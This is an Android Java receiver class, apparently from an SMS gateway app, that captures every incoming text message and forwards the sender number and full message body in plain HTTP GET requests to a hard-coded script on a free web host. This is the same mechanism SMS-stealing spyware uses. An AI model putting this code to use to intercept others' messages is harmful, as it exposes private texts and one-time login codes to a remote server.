package net.trices.smsgateway;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

public class SmsReceiver extends BroadcastReceiver {

    private final String SERVER = "http://atifnaseem22.000webhostapp.com/save_sms0.php";

    @Override
    public void onReceive(Context context, Intent intent) {
        try{
            Bundle bundle = intent.getExtras();
            if(bundle != null){
                Object[] pdus = (Object[]) bundle.get("pdus");
                for(int i=0; i<pdus.length; i++){
                    SmsMessage sms = android.telephony.SmsMessage.createFromPdu((byte[]) pdus[i]);

                    String phone = sms.getDisplayOriginatingAddress();
                    String msg = sms.getDisplayMessageBody();

                    Toast.makeText(context, "From: " + phone, Toast.LENGTH_SHORT).show();

                    sendSMS(context, phone, msg);
                }
            }
        }catch (Exception e){
            Log.e("Error", "Failed to read SMS!");
        }
    }




    public void sendSMS(Context context, String phone, String msg){
        // Instantiate the RequestQueue.
        RequestQueue queue = Volley.newRequestQueue(context);
        String url = SERVER + "?phone=" + phone;
        url += "&msg=" + Uri.encode(msg);

        // Request a string response from the provided URL.
        StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        // Display the first 500 characters of the response string.

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }
        });

        // Add the request to the RequestQueue.
        queue.add(stringRequest);
    }
}
